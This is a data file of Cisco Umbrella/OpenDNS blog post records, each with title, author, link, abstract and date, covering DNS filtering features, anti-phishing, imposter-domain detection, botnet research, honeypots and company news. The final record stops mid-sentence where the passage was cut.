{"website": "Cisco-Umbrella", "title": "Adult site blocking now available on OpenDNS", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/adult-site-blocking", "abstract": "Last month, when we launched the ability to block specific domains, we heard from you loud and clear: you want the ability to block adult websites in an easy way that puts you in control. Today we’re excited to offer you that ability . Like everything else we do, we wanted this feature to be powerful and simple to use. That’s why we teamed up with the smart folks at St. Bernard Software (a leader in internet filtering) to make it happen. St. Bernard’s iGuard service is the only 100% human-reviewed system of its kind with millions of sites categorized and reviewed. Everyone has a different idea of what they consider to be adult content and we wouldn’t pretend to guess what it is. That’s why we’ve broken our adult site blocking feature into six categories that cover different themes. Pick the ones you want to block or don’t block anything; it’s up to you. If you’re interested in blocking adult content, OpenDNS is the easiest way to do it. Like all our other features, it requires no on-site hardware, there’s no software to install or update, and it’s free. Turn it on now", "date": "2007-06-10"},
{"website": "Cisco-Umbrella", "title": "Block the bad guys with OpenDNS!", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-domain-blocking", "abstract": "We’re launching a powerful new feature today. We are giving you the power to block specific websites. That means you can protect your computer, your house, your office and anything else that uses DNS from being able to service domains that you don’t want to load. Oh, and best of all: This service is totally free. When customers started to ask for this feature we wondered who would want this. The geeks here in the office remarked that this kind of blocking would be trivial with a Linux server and some proxy/filtering software installed. Then it quickly dawned on us. (Eureka!) It’s not just mom and dad at home who have no easy way to just block an individual domain with any ease but it’s also network administrators at offices. Network administrators can now block problem domains for their entire office in a simple way without having to pay 1000’s of dollars in new hardware and time to achieve similar functionality. Does your ISP’s DNS server let you do this? Blocking domains is really easy. Here’s how you do it: Sign in to your OpenDNS account and make sure you have a network configured. Go to the Networks tab in your account and click on the Settings icon ( ) for your network. Click on the Blocked domains link and add a domain to be blocked. You can delete or edit blocked domains on that same page. When you block a domain you block what is technically called a “zone.” This means it also blocks all sub-domains. Here’s an example. If you block craigslist.org then you’ll also be blocking la.craigslist.org (Craigslist Los Angeles) and sfbay.craigslist.org (Craigslist San Francisco), etc. If, instead, you just blocked newyork.craigslist.org then the rest of the Craigslist properties would load just fine. When you try to visit a domain that is blocked in your network you’ll see a page that looks like this: Since this is your network , we will show your logo on the blocked page, just as we do on the Guide pages. What? You haven’t uploaded your own logo yet? Go do it now, and go block some domains! Let us know what you think!", "date": "2007-05-13"},
{"website": "Cisco-Umbrella", "title": "Friends of OpenDNS, meet PhishTank", "author": ["Allison Rhodes"], "link": "https://umbrella.cisco.com/blog/friends-of-opendns-meet-phishtank", "abstract": "PhishTank is alive, and filling up. PhishTank is a community anti-phishing Web site where anyone can go to submit suspected phishes, track the status of their submissions and help verify others’ submissions. Unlike other anti-phishing efforts that may come to mind, PhishTank is totally free to use and open to access. After a qualified number of users collectively agree that a suspected phish is, in fact, a real phish, the phish becomes verified. ( Amit drew the Digg parallel.) But we didn’t stop there. Because we genuinely want to stop phishing and believe firmly that phishing data should not cost money, PhishTank has a free and open API . Our hope is that developers will use PhishTank data to build anti-phishing elements into their tools. And you’ve probably guessed by now how OpenDNS uses PhishTank data. Once the PhishTank community collectively verifies a phish, we conduct an additional layer of checks and balances and ultimately block the phish for OpenDNS users (if the users have phishing protection enabled, of course). We still get phishing data from other sources, too, but we think you’re going to help make PhishTank our best source. We want OpenDNS to be the best it can possibly be, and in order for that to happen we need the best phishing data available. But we’re not selfish — the data belongs to all of us. Read more about PhishTank here and let us know what you think!", "date": "2006-10-02"},
{"website": "Cisco-Umbrella", "title": "Automating imposter domain discovery", "author": ["Brad Antoniewicz"], "link": "https://umbrella.cisco.com/blog/automating-imposter-domain-discovery", "abstract": "Deceiving domains lure users Attackers have long used typosquatting , brandjacking , and similar methods to deceive users into unknowingly visiting malicious websites. To keep the asymmetric battle going, defenders have taken up searching newly registered domain names to uncover these threats before they materialize. In this post we’ll share the common patterns we see, plus a technique for automating discovery so you can one-up those pesky attackers. Prepending or appending common words The pentesters out there will agree that one tried-and-true recipe for a successful phishing exercise is to send an email with “mandatory” in the subject line and a link to malicious page hosted at “companyname-support.com”. Prepending or appending common tech words to a brand is one of the most common techniques used by attackers; it works because users find something inherently trustworthy about a familiar string such as the company name or internally used jargon. Searching for occurrences of these is simple: Character substitution Substituting visually similar characters is another common method. Here the attacker may use letters like uppercase “i” or lowercase “L”interchangeably or replace letters with numbers in a leet speak fashion. We can expand our regex to incorporate this pretty easily as well: Repeated characters Finally, repeated characters in a brand can be often mistakenly left out, duplicated, or overlooked. For instance, an attacker may register facebok.com, or perhaps a user may mistakenly type faceboook.com. A minor change to our regex can adjust for repeated characters: Automating discovery While our classification algorithms have automated the broad discovery of these types of attacks at a much more advanced level, responders can still benefit from basic pattern searching on the brands they need to worry about. The Investigate API is the perfect tool for facilitating this type of automation, and pyinvestigate makes interacting with the API painless. To search for a string within the last 24 hours, you can: Regex Generator If you’re monitoring just a single brand, you might be able to get away with creating static regular expressions. However, to support searching for many brands, you’ll need to implement a basic regex generator. Here’s an example of one that will look up static mappings for each letter of the brand and return a list of character substitutions: Search Constraints It makes sense to search within an extended time period when you first search for imposter domains so that you can get a feel for what’s out there. Once you are aware of all of the domains matching your brand, you can speed up the process by constraining your search to just the last 24 hours and running the search at a regular interval within the time period. Brand Watch Brand Watch is a python application which implements the methods described in this blog post. You can access its source here: https://github.com/brad-anton/brand_watch Running it is simple: Excluding domains To exclude certain domains you have already investigated, provide a text file to the -e command line argument and they won’t be shown: Now you can set this up as an upstart task or cron job to detect new domains—you could even have it shoot off a daily email if you were so inclined 🙂 Enjoy!", "date": "2016-07-08"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Security Labs at BSides Las Vegas, Black Hat, and Defcon", "author": ["Andrew Hay"], "link": "https://umbrella.cisco.com/blog/opendns-security-labs-at-bsides-las-vegas-black-hat-and-defcon", "abstract": "It’s that time of year where security folks descend upon the desert of Las Vegas for what many call “Security Summer Camp” or, in some circles, “Hacker Summer Camp”. We, of course, mean the Holey Trinity (see what we did there?) of Security BSides Las Vegas , Black Hat , and Defcon . Security Analysts Kevin Bottomley and Josh Pyorre will be attending BSides Las Vegas to see a number of great talks including one from OpenDNS Engineering’s Andrew Hess entitled Advancing Internet Security Research with Big Data and Graph Databases . In the talk, Hess will provide an overview of OpenDNS’s threat intelligence database system and focus on how it has influenced security research at OpenDNS. This is the system that we, the OpenDNS Security Labs team, relies on for both data ingestion from our resolvers and serves as the repository for our threat model results….hopefully he doesn’t give away too many secrets about how the cyber-sausage is made. OpenDNS will also have a booth at the Mandalay Bay Resort and Casino for Black Hat USA 2015. Why not stop by booth 753 to catch up with the OpenDNS Security Labs team, watch a demo of our products, snag a fancy t-shirt, and enter to win an Apple Watch? Dr. Dhia Mahjoub, Sr. Security Researcher, Anthony Kasza, Security Researcher, Andrew Hay, Director of Research, and Dan Hubbard, CTO will be at the booth throughout the day. If you happen to drop by and the person you’re looking for is not there, please leave a business card, written note, or verbal message and we’ll try and sync up with you. You can also meet with Dhia, Andrew, or Dan by scheduling a one-on-one meeting through our scheduling form . We have a meeting room off the show floor so private conversations are welcomed (and encouraged). You should also plan on attending Dan Hubbard and Andree Toonk’s presentation entitled BGP Stream on Thursday, August 6th, from 12:10-1:00pm in South Seas IJ. In the presentation, Dan and Andree will talk about their methodology and tool—conceived during a recent OpenDNS Hack-a-thon—that can be used to monitor BGP ASN hijacks, historical relationships, and geographic locations of announcing Internet routers. This “alert system for the Internet” is described on our OpenDNS blog, found here . You can, and should, also follow the dedicated Twitter account @bgpstream . Finally, you may have already started to notice complaints about the long wait times for a taxi at McCarran International Airport. Vegas needs @Uber so bad. Standing in cab line. About one cab showing up every 2 minutes. — Chris Eng (@chriseng) August 3, 2015 Why not skip the line and jump on the OpenDNS Limo? We’re picking up from the Las Vegas airport Tuesday & Wednesday every 30 minutes. Just follow signs. We will make sure you get the details if you sign up here . Please note, the limo runs Tuesday (5am to 10pm) and Wednesday (5am to 1pm) and only travels between McCarran and the Mandalay Bay Resort and Casino. If you’re lucky enough to be arriving between 8am and 10am on Wednesday, Andrew Hay will regale you with tales of security from his adventures on the tropical island of Bermuda and of a far away and magical land…called Canada. The OpenDNS Security Labs team will also be headed to Defcon to learn about some of the cutting edge research our peers have published – some responsibly, some not as responsibly. Dhia, Andrew, Kevin, Josh, and Anthony will be joined by Thibault Reuille, Sr. Security Researcher. Hopefully we’ll get a chance to connect at one of these amazing venues, at a party, or while waiting in a long line for food or a taxi. We should be easy to spot as we’ll likely be wearing the t-shirts that get us noticed wherever we go. See you there!", "date": "2015-08-03"},
{"website": "Cisco-Umbrella", "title": "Life's A Pitch, and Then You Investigate", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/lifes-a-pitch-and-then-you-investigate", "abstract": "Are you tired of business as usual ? Having trouble stopping the kill chain before it even begins ? Are you sick of not being able to adequately pivot through a malware attacker’s infrastructure ? Well, LOOK NO FURTHER! OpenDNS is proud to announce the rerelease of OPENDNS INVESTIGATE! OpenDNS Investigate is a great tool for both Internet Security Researchers and Incident Responders alike for when time is of the essence and you need information NOW! As an employee of OpenDNS, and a proud member of the Security Research Team, I’ve had access to this tool since its creation and I can solemnly say that it has improved my life tenfold and it feels like I’m on vacation every time I use it. All joking aside, the Investigate tool is a great resource that gives you a top-down view of any domain, IP address, ASN or email address that you wish to review and attain more information about. This wonderful tool draws from OpenDNS’s extensive historical data, which becomes very beneficial for reviewing domains whose information may have changed shortly before the attack evaluation. OpenDNS Investigate includes information such as geo location, ASN distribution, TTL averages and standard deviations, and IP addresses and Name Servers for a domain, to name a few. There are, however, many other features that are unique to OpenDNS Investigate. For instance, the DNS Query Graph will display the number of queries per hour, specifically pulling from all OpenDNS users over the past 30 days. Some exclusive features that come with OpenDNS Investigate are the multiple “scores” and colored notification alerts, which are all result dependent. Some of the scores that you will see displayed are as follows: SecureRank2 – The ranking of a domain based on the lookup behavior of the client IP for the domain. This score is designed to identify domain names requested by known infected clients but rarely requested by clean clients. RIP Score – A score given to a domain based on the IP address (or addresses) it resolves to and the reputation score of the IP address (or addresses). If a domain resolves to an IP or IP range that is considered to have a poor reputation, it will be reflected in this score. ASN Score – Similar to the RIP Score, however it pertains specifically to ASNs Requester Geo Distribution – A score representing the number of queries from clients visiting the domain, broken down by country. DGA Score – This score is generated based on the likeliness of the domain name being generated by an algorithm rather than a human. This algorithm is designed to identify domains, which have been created using an automated randomization strategy. Security Graph Score – A mathematical computation based on the security features and scores that pertain to a domain. Think of this as an overall score based on the rest of the scores listed. In addition to the scores, one can also view the Domain Query Handling information for a domain, which shows which types of DNS responses the OpenDNS resolvers provided for the domain in question. And if I may interject, one of my favorite attributes to look at when reviewing a domain are the Co-Occurrences and Related Domains. The Co-Occurrence domains are domains that have been visited before and after the domain in question. The Related Domains are the domains requested around the same time (up to 60 seconds before or after) as the given domain name, but that are not frequently associated with other domain names. Essentially, it’s the domains that are visited both before and after the domain you’re reviewing. The interface for reviewing IP addresses is slightly different, but still comprehensive. The IP Address view is displayed whenever you search on an IP, or when you link to an IP from the Domain View. Generally, the first thing that’s displayed, is information regarding the amount of malicious domains hosted on the IP for the previous week. However, if the IP isn’t hosting any malicious domains, this is also reflected in the results. The IP view will also display many other fields such as the LD2 and LD3 domains count (as well as some diversity scores relating to these domains) and the ASNs associated with the IP address. In addition, if the IP address ends up being a Name Server, OpenDNS Investigate will also list the first 1000 domains that the IP is hosting. The Investigate tool has officially announced the inclusion of WHOIS information! The WHOIS information listed in Investigate is not gathered by performing a real time WHOIS lookup against another database, but rather from the extensive database maintained by OpenDNS within Investigate. The WHOIS information will show the standard output of registered users or assignees for the domain queried, along with a full range of typical WHOIS data for a domain. When a domain is malicious, additional domain details are displayed regarding the malicious categorization. These are intended to call out attention to particular information that may be useful or relevant to the particular domain that you are researching. A good friend and colleague of mine, Anthony Kasza, recently posted a blog about why WHOIS information is an important factor to consider when researching the validity of a domain. OpenDNS Investigate is a great addition to any business looking to increase their visibility into internet research. I never leave home without mine! RIP Billy Mays.", "date": "2015-07-22"},
{"website": "Cisco-Umbrella", "title": "Field Reports: Why a school district switched from Barracuda Networks to eliminate bottlenecks", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/field-reports-why-a-school-district-switched-from-barracuda-networks-to-eliminate-bottlenecks", "abstract": "Summit Hill School District 161 is a forward-thinking school district catering to a rapidly-growing population in Illinois. In this edition of Field Reports, we take a close look at why this growing district chose OpenDNS Enterprise Web filtering and malware protection to secure the networks used by nearly 4,000 students and staff members. Before discovering OpenDNS Enterprise, the technology team at SHSD 161 was using a Barracuda Networks Web filtering solution. However, the product could not accommodate the growing demand in Web traffic that SHSD 161 was seeing and it increasingly created bottlenecks. When the SHSD 161 team looked to Barracuda Networks for a replacement solution, they learned that the price had skyrocketed. The team searched exhaustively for a new solution, and ultimately determined OpenDNS Enterprise to be the best choice for protecting their seven schools and administrative office. Why? The team tells us OpenDNS Enterprise is, “the easiest to deploy, lowest total cost of ownership overall, with no network bottlenecks due to changes in traffic demand, and high reliability.” SHSD 161 operates a defense-in-depth security strategy, so because OpenDNS Enterprise delivers an Internet-wide security solution that also adds a layer of malware protection, it gives SHSD 161 significant additional value. The SHSD 161 team says, “We would definitely recommend OpenDNS Enterprise. It’s a slam-dunk: easy to set up, configure and manage, and allows you to make the changes fast and get on with your day.   We have 100 percent coverage and zero problems!”", "date": "2012-04-26"},
{"website": "Cisco-Umbrella", "title": "The Advantages of Malware & Botnet Protection at the DNS Layer", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/the-advantages-of-malware-botnet-protection-at-the-dns-layer", "abstract": "We don’t often take to the blog to talk about some of the more advanced OpenDNS Enterprise security features, like our malware and botnet protection, but we know a lot of organizations rely on them to keep their networks secure. Today, I’d like to talk a little more about how our malware and botnet protection works, and why we’ve started seeing so many organizations move to OpenDNS Enterprise primarily for that added layer of internet security. As with all of the advanced functionality OpenDNS has built atop our superfast recursive DNS service for businesses and schools – like the Web content filtering , phishing protection, and stats available in OpenDNS Enterprise —  our malware and botnet protection innovates on traditional offerings, and it works on any device connected to the network (including, say, an iPad that an employee brought from home). OpenDNS blocks malware and botnet attacks before they can infect a network. We aren’t terminating an existing malicious connection, or cleaning up a breach that’s already occurred; as soon as OpenDNS sees an attempted connection to a malicious domain or IP address, we block it. A side benefit is that if an infected device is brought on to a protected network, OpenDNS can make sure that the infection doesn’t spread to other connected devices on the network if they do so via external command and control. OpenDNS Dashboard Malware Notice If you’re wondering why this matters: when Vanderbilt University switched to OpenDNS Enterprise in 2010, they blocked 1.5 million malware attacks in the first four months following the deployment. That’s 1.5 million potential data leaks thwarted, and 1.5 million device cleanups avoided. It’s certainly something to think about, as the threat of malware and botnet attacks continues to escalate.  If you don’t have any malware or botnet protection for your organization, or you’re thinking about adding another layer of protection to your network, consider trying out OpenDNS Enterprise as your first line of defense.", "date": "2012-02-02"},
{"website": "Cisco-Umbrella", "title": "Researchers Sweet on Honeypots at Blackhat USA", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/researchers-sweet-on-honeypots-at-blackhat-usa", "abstract": "True to their name, honeypots are traps designed to lure hackers into attacking a server or system as defenders gather information about their methods. According to SANS, honeypots are “setup to be easier prey for intruders than true production systems but with minor system modifications so that their activity can be logged or traced.” These traps often produce a wealth of knowledge security professionals can use to strengthen their defenses. Despite the great advantage they provide, however, honeypots are not deployed as widely as the once were. Defenders are busier than ever, and honeypots are complex—specifically, they’re difficult to deploy quickly. As Greg Martin from ThreatStream explained in an article he wrote last week for Power Magazine , “Many organizations see honeypots as too complicated to launch and manage over time, and view them primarily as a tool for security researchers.” Honeypots also offer only a limited use case. Lance Spitzer of WindowSecurity.com elaborates on this problem. “Honeypots all share one huge drawback; they are worthless if no one attacks them. Yes, they can accomplish wonderful things, but if the attacker does not send any packets to the honeypot, the honeypot will be blissfully unaware of any unauthorized activity.” Haroon Meer, founder and researcher at Thinkst, says honeypots can be a useful tool to be proactive in an era known for large-scale breaches of security. As the public becomes more aware of these security breaches, companies involved need quicker disclosure. Meer says honeypots could be a huge help toward that effort. “We need honeypots to come back because we can’t have people finding out they’re breached because Brian Krebs writes about it,” Meer said during a presentation at BlackHat USA 2015 . Meer and his presenting partner Marco Slaviero explained that–in addition to the reasons above–honeypots have fallen out of favor for not being “preventative” security solutions. In a cyber arms race, they said, defenders are falling too far behind in terms of tools available. “It’s not an arms race, we’ve already lost,” Meer said. “Just look at OPM.” Honeypots, he explained could be a tool that makes the arms race more competitive. According to Slaviero and Meer, honeypots are a great addition to any organization’s security posture as “even one alert from a honeypot is valuable.” To prove this value, the two created an enterprise tool called Canary , a series of honeypots that send notifications when attackers hit them. These “canaries” are also specifically designed to entice an attacker to explore further, giving defenders a better profile of who they are dealing with. The pair also discussed the open source version, OpenCanary . OpenCanary is a low-interaction honeypot, which reduces risk and makes it easier to deploy, as it does not use a real OS or applications. Honeypots are a good idea Slaviero and Meer said, just “largely ignored by the industry.” With the advent of a new tool like Canary and OpenCanary, this may soon change. As Spitzer commented in his article, “honeypots will not solve an organization’s security problems. Only best practices can do that. However, honeypots may be a tool to help contribute to those best practices.”", "date": "2015-08-06"},
{"website": "Cisco-Umbrella", "title": "Operation Kelihos: Presented at BotConf 2013", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/operation-kelihos-presented-botconf-2013", "abstract": "Nearly two weeks ago, the picturesque city of Nantes hosted “The First Botnet Fighting Conference” – BotConf’13 – on Dec 5th and 6th. This was a great event where researchers from the security industry, academia and law enforcement presented and discussed the latest findings and initiatives in fighting botnets and prosecuting the criminals behind them. Our Presentation: As security researcher from Umbrella Labs at OpenDNS , and a member of MalwareMustDie, I was pleased to be part of the event. I teamed up with Hendrik Adrian ( @unixfreaxjp ), founder of MalwareMustDie, to give a talk detailing our campaign against the Kelihos Fast Flux Botnet. Our session consisted of multiple parts – in my section, I focused on the domain, IP monitoring and data analysis of different elements of the infrastructure of the botnet. First, I described the different components of the fast flux monitoring system (which has been operational since early July and was presented at APWG eCrime 2013 ). Building this system was the outcome of successive studies on fast flux and Kelihos [1] [2] [3] . The system detects new Kelihos domains in real time, as soon as they trigger DNS traffic, which is made possible thanks to the large visibility of OpenDNS into Internet traffic. The system also monitors the growth of the botnet on a continuous basis. We then shifted focus to show statistics and trends on various elements of the Kelihos botnet that stress the extent and actuality of this threat. Given a sample of 900+ Kelihos domains collected since mid-summer of 2013, we described the following features: TLD distribution Botnet geo-distribution Botnet’s live hosts daily cycle OS distribution Daily detected Kelihos domains Domains and IPs lifetime Malware sample statistics and detection ratio Some notable facts about the Kelihos botnet are: 900+ fast flux domains and subdomains have been used by Kelihos malicious campaigns The most abused TLDs have been .ru, .com, and .net The Kelihos botnet has infected hosts in 100+ countries The current size of Kelihos is about 44,000+ bots 11,000+ IPs have hosted Kelihos domains The most infected countries are Ukraine, Taiwan, Russia, Japan, and there are also infections in the US 85% of bots are running Windows XP/Vista (from a sample) A small number of Kelihos domains stayed active for nearly 2 months, acting as nameservers for other Kelihos domains, with the majority of domains having a lifetime of 1 day or less A small number of botnet IPs stayed active for up to 3 months, and some were active even longer. These “zombie” IPs point out the real challenge of cleaning up infected machines. Some of these long lasting infected hosts are in universities. The majority of IPs had a lifetime of 1 day or less Below, we show the geographical distribution of a snapshot of the botnet’s 40,000+ live hosts: [load-javascript slug=”kelihos-live-bots-40k”] In the figure below, we show the daily fluctuations of the number of live Kelihos bots over the first 2 weeks of December 2013. The daily cycle follows the time zone of Ukraine and Russia (UTC+2), i.e. the number of live bots peaks during busy computer usage hours, and drops during the night hours. For the sake of visualization, the animations below show the daily cycle of live bots over a period of 2 weeks. The first animation is based on the IP infection maps of Kelihos followed by the world map view. These animations were a collaboration with my colleague @ThibaultReuille : Using the data collected while preparing this talk, Kelihos was also featured in OpenDNS Security Labs’ 2013 Most notable attacks visualization microsite. The remaining parts of our BotConf presentation are greatly described in MalwareMustDie’s blog , in which @unixfreaxjp analyzed the weaknesses of Kelihos, which helped us investigate and infiltrate the botnet. We then disclosed the identity of the bad actor, and finally, discussed the best methodology to neutralize or slow down Kelihos by stopping the payload distribution from the CnCs to the bots. (Keep in mind that bad guys adapt and adjust their infrastructure and MO, so the fight is still on.) Needless to say, the progress and good results achieved by “Operation Kelihos” would not have been possible without the outstanding collective work and efforts of the tireless members of MalwareMustDie. The Conference: Several blogs have been posted since last week that provide great recaps of BotConf’s busy two days. We encourage you to check them out: [4] [5] [6] [7] [8] [9] . There were several talks that caught my attention and interest. Just to name a few: Distributed Malware Proxy Networks – Brad Porter and Nick Summerlin Spam and All Things Salty: Spambot v2013 – Jessa dela Torre Using cyber intelligence to detect and localize botnets – Enrico Branca Spatial Statistics as a Metric for Detecting Botnet C2 Servers – Etienne Stalmans and Barry Irwin The Home and CDorked campaigns : Widespread Malicious Modification of Webservers for Mass Malware Distribution – Sébastien Duquette My Name is Hunter, Ponmocup Hunter – Tom Ueltschi APT1: Technical Backstage – Paul Rascagnères Europol and European law enforcement action against botnets – Jaap van Oss DNS Resolution Traffic Analysis Applied to Bot Detection – Ronan Mouchoux Exploit Krawler: New Weapon againt Exploits Kits – Sébastien Larinier and Guillaume Arcas The hunter becomes the hunted – analyzing network traffic to track down botnets – Thomas Chopitea I take my hat off to the organizers for the outstanding execution of the conference: “Un grand Bravo à Eric et co.” The speakers delivered excellent and high quality presentations. To all the attendees, I’d like to say, “Thank you for the great engaging discussions and the good time at the dinner parties!”", "date": "2013-12-18"},
{"website": "Cisco-Umbrella", "title": "Saving Time and Money With Umbrella for MSPs", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/saving-time-and-money-with-umbrella-for-msps", "abstract": "With the new model of cybercrime as a service, bad actors are not only increasing in number, but they are becoming more agile—making cybercrime cheaper and easier than ever. The changing threat landscape is resulting in increased security risks for small and medium sized businesses (SMBs), some of whom are turning to managed services providers (MSPs) for help with security solutions. According to Symantec’s 2014 Internet Security Threat Report , “targeted attacks aimed at small businesses (1-250 employees) in 2013 accounted for 30 percent of all such attacks…the trend shows that the proportion of attacks at organizations of this size was increasing throughout the year…” While they may have not previously thought of themselves as high-risk targets, this proves SMBs need to take security seriously, and we know that one of the most effective ways for them to do so is by working with an MSP. In OpenDNS’s webinar, Standardizing and Strengthening Security to Lower Costs , Senior MSP Product Manager Dima Kumets discusses best practices for MSPs in a landscape that is more demanding than ever. Here’s a condensed version of the highlights to help you save time and increase revenue with your OpenDNS partnership. Risk Management is All About Layers Just like bulletproof glass is made from layers of different materials, a managed security service requires more than one product to be effective. Signature-based tools like antivirus, firewalls, and intrusion prevention are only effective against 30-50% of current security threats . It’s not enough to rely on reactive products, and OpenDNS is a critical layer in your security stack that protects users at the network layer without signatures, and with predictive intelligence. Fortunately, you can deploy Umbrella regardless of your customers’ existing setup. By deploying Umbrella, you gain automated protection from infections, which will give your team breathing room for more important work. Save Time With Centralized Settings In streamlining your process with the Centralized Settings feature in Umbrella, you will save time with standardization and automation. Instead of creating exceptions for individual customers, you can manage customers in bulk. Take managing by vertical, for example, since the needs of a doctor’s office are going to be different from those of an elementary school. Customize the solution to your own standard and implement changes once as opposed to repeating the process for every new customer. Use the Cloud Services Report to Avoid ‘Surprise’ Tickets With ‘shadow IT,’ employees are buying or using their own consumer cloud services without MSP involvement and often without management’s knowledge. Unknown cloud services can create surprise tickets which then take up valuable MSP time and energy. With OpenDNS’s cloud services report, you can view all cloud services that a customer organization is using. This allows you to regain quick visibility instead of having your most senior tech spend his or her time looking at loglines. The report is also useful for compliance checks. Proactive knowledge of cloud services used by your customers eliminates surprises, saves time, and ensures that you’re not missing out on revenue. Hire More Efficiently While in the field with MSPs, Kumets hears a lot about the arduous task of hiring new team members. He says, “At MSP panels, I always hear how difficult it can be to hire good people who are technical and also customer facing, and who share your MSP values.” In reducing tickets by deploying OpenDNS, our MSP partners are able to increase their team’s bandwidth, thereby reducing the need for more hands on deck. One such partner is Mirus IT, an MSP in Milton Keynes, U.K., which saves approximately £60,000 per year in engineering costs with its OpenDNS deployment. We want to help your business grow, and our hope is that with OpenDNS you have the ability to hire on your terms instead of finding yourself in a crunch. When You’re Saving Time, You’re Saving Money Paul Tomlinson, Mirus IT Manager explains, “as a managed service provider we work on a fixed cost, so it’s up to us to reduce our cost of supporting the customer.” Once Tomlinson’s team was able to reduce the time of a typical rebuild from eight hours to “as little as 15 minutes,” Mirus could see that their effective bill rate was improving dramatically. We want to help you deliver seamless, reliable security to your SMB customers as efficiently as possible. Watch the full webinar for more details on the changing MSP landscape and for more information on increasing your ROI with OpenDNS. For more information about getting value out of your experience with Umbrella for MSPs, please read our whitepaper, Get Out of Firefighting Mode and Get in Control .", "date": "2015-03-09"},
{"website": "Cisco-Umbrella", "title": "T-minus 30 days: The countdown to SysAdmin Appreciation Day Begins", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/sysadmin-appreciation-day", "abstract": "Once a year, we honor the person who keeps the mail server running, restores the file you accidentally deleted and makes sure you can watch funny videos of cats. This person is the SysAdmin, the unsung hero of every great company. Ours is George. George makes sure that the right wires are connected to the right routers to the right switches to the right servers, which are connected to the right databases so that you get the best DNS service in the world. At OpenDNS, we make the SysAdmin’s life easier every day by giving you all those green checkmarks signifying day after day of zero downtime along with the features to help make doing your job easier. SysAdmins are so important, we think it’s lame they only get one day of honor. It’s no secret that most times the SysAdmin only gets recognized when things go wrong. So this year, OpenDNS is celebrating SysAdmin Day throughout the month of July, not just on July 27th . Every Monday in July we’ll deliver you a challenge, and every Friday we’ll announce the winner on our blog. Only SysAdmins are welcome to participate. Prizes will surely be something you consider a gift. (Hint: It won’t be more DNS uptime. You’re using OpenDNS, so you get that anyway. Hint 2: It includes the words “Gift” and “Certificate.”) The guys at AdminSpotting sum it up so well, so we thank them for the below poem. There were a few bad words we left out of our version, read theirs for the original, in all its SysAdmin-y glory. Read and enjoy, SysAdmins. It’s not just your day, it’s your month. Choose no life. Choose no career. Choose no family. Choose a big computer, choose hard disks the size of washing machines, old cars, CD ROM writers and electrical coffee makers. Choose no sleep, high caffeine and mental insurance. Choose fixed interest car loans. Choose a rented shoebox. Choose no friends. Choose black jeans and matching combat boots. Choose a swivel chair for your office in a range of fabrics. Choose NNTP and wondering why you’re logged on on a Sunday morning. Choose sitting in that chair looking at mind-numbing, spirit-crushing web sites, stuffing junk food into your mouth. Choose rotting away at the end of it all, pishing your last on some miserable newsgroup, nothing more than an embarrassment to the selfish, [omitted] up lusers Gates spawned to replace the computer-literate. Choose your future. Choose sysadmining.", "date": "2007-06-27"},
{"website": "Cisco-Umbrella", "title": "Where in the World are Infected Devices Most Common?", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/global-botmachines", "abstract": "When you decide that you’re done working for the day and log off until the next morning, your computer might not be going to sleep when you do. If it’s been infected by a botnet attack, there is a very high chance that the machine is still actively phoning Command-and-Control servers, receiving and acting on instructions to perform nefarious activities. Your computer could be working long into the night, sending out spam emails by the thousands or even participating in a DDOS attack. In this post, we’ll take a look at the landscape of online bots, and see what parts of the world are home to the most infected machines. You’ve probably seen this rotating globe on the Labs website. It graphs the real-time botnet requests coming from and going into different countries around the world. 50 million people worldwide use our DNS service, and we handle 50 billion DNS requests per day. Of those, the total number of botnet requests that we automatically detect and block is approximately 80 to 90 million per day. Recently we decided to take a look at the global distribution of bot machines. What areas of the world are most affected by botnets? To provide a geographic view of the actual number of bot machines, we queried the OpenDNS passive DNS log for the unique IPs communicating to a list of known bot CnC servers over a 60 minute window. To make a fair global comparison, we sampled 6 p.m.—7 p.m. on a single day in each local time zone. Take a look at the interactive heatmaps below to see a visualization of how infected devices are distributed around the world: Map A shows the total DNS bot requests from one country over the course of one hour. [load-javascript slug=”botnetreq2″] Map B shows the percentage of bot machines among all online devices in a country. [load-javascript slug=”percentofAll”] We see that the highest ratio of bot infections are seen in Kazakhstan and Belarus, keeping in mind that our numbers do reflect the smaller number of total users of OpenDNS in those countries. Across the globe, we see that about 1 out of 100 online devices is a bot, actively communicating with CnC servers. The U.S., China, and Brazil fare slightly better, at an infection rate of 4 out of 1000 devices. While we were proud to notice that Internet users in Estonia and Brunei are using OpenDNS services, unfortunately all of the devices we observed from these countries have called out to the CnC servers. They were not shown in the map above to avoid skewing the results.", "date": "2013-08-20"},
{"website": "Cisco-Umbrella", "title": "Welcome South Africa, OpenDNS's 25th Datacenter!", "author": ["Jennifer Basalone"], "link": "https://umbrella.cisco.com/blog/welcome-south-africa-opendnss-25th-datacenter", "abstract": "Johannesburg, South Africa, is officially OpenDNS’s 25th datacenter. It’s a no-brainer to add South Africa to our roster, a country so rich in culture, biodiversity, and technological achievements. Along with being our 25th datacenter, it is also our second deployment in the southern hemisphere. Adding South Africa to our global anycast network further establishes our global presence and improves our customer experience. This allows us to route your DNS requests to the closest location automatically, anywhere at anytime. Previous to having a South Africa datacenter, OpenDNS users in this region would connect north to a variety of European POPs. This new location shaves 200ms of latency, dramatically improving user experience. One way OpenDNS network engineers determine this increase in performance is with a tool called Ripe Atlas . This tool provides great insights when troubleshooting issues or viewing performance changes in all of our regions. Using Ripe Atlas we confirmed the intended performance improvements for our users are not just isolated to South Africa. The entire southern African region has benefited. We saw the latency for OpenDNS users in South Africa improve from 180ms to just a few milliseconds. A typical user in Tanzania improved from 140ms to 50ms. And in countries like Kenya, a decrease in response time from 180ms to 56ms is a major improvement for the southern region of Africa. JNB marks the fifth datacenter deployment of which I have had the privilege to be a part. Deployments are an orchestration within OpenDNS that involves several teams. Each of these teams has doubled, and in some places tripled in size since I joined the organization. Unlike typical fast growing companies, the growth hasn’t slowed our progress. The coordination between teams has been seamless, from procurement, rack, stack, and provisioning. Wouter Vanwalleghem, our Systems 